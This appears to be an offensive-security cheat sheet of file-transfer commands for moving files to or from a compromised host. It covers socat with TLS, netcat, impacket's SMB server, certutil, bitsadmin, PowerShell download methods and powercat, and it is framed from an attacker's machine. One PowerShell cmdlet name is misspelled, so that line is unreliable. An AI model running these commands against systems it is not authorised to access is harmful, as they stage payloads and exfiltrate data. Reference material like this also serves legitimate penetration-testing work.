## socat: encrypted file transfer
### step #1: on attacker machine, generate a create a key and a certificate associated with it.
```bash
openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
```
### step #2: on attacker machine,create a pem file from the key and crt files
```bash
cat socat.key socat.crt > socat.pem
```
### step #3: on machine hosting the file:
```bash
socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork file:file.txt
```
### step #4: on machine receiving the file:
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 file:file.txt,create
```
## Powershell transfer: using .Net WebClient:
```powershell
(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)
```
## file transfer with netcat
### on recieving end
```bash
nc -nlvp 443 > incoming.exe
```
### on sending end
```bash
nc -nv <LHOST> 443 < /path/to/file_to_be_sent.exe
```
## SMB file transfer with impacket's `smbserver.py`
### start server on kali
```bash
smbserver.py <SHARE_NAME> `pwd` -smb2support
```
### copy/move file from share
```shell
xcopy \\<LHOST>\<SHARE_NAME>\<FILE_NAME> c:\windows\temp
```
### copy/move file to share
```shell
xcopy c:\windows\temp\test.txt \\<LHOST>\<SHARE_NAME>\test.txt
```
## using `certutil.exe`
```shell
certutil -f -urlcache HTTP://<LHOST>:<LPORT>/<FILE_NAME> c:\windows\temp\<FILE_NAME>
```
## using `bitsadmin`
```shell
bitsadmin /transfer myDownloadJob /download /priority high http://<LHOST>:<LPORT>/<FILE> c:\windows\temp\<FILE_NAME>
```
## using powershell `Start-BitsTransfer`
```powershell
Start-BitsTrasnfer -Source "HTTP://<LHOST>:<LPORT>/<FILE_NAME>" -Destination c:\windows\temp\<FILE_NAME>
```
## using powercat
### on receiving end:
```bash
nc -lnvp 443 > incoming.exe
```
### on sending end:
```powershell
powercat -c 10.11.0.4 -p 443 -i <PATH\TP\FILE>
```